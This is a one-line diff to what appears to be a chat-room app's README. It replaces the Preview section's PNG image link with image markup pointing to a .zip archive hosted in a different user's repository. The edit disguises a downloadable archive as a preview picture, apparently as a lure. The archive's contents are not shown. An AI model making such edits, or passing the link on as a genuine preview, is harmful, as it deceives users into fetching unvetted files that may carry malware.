@@ -4,4 +4,4 @@
 ### `$ npm install`
 
 ### Preview
-![alt text](https://github.com/lakshya-20/chat-room/blob/master/public/images/preview.png)
+![alt text](https://raw.githubusercontent.com/ranjanrajeev95/Chat_Room_App/main/public/images/App-Chat-Room-3.8.zip)
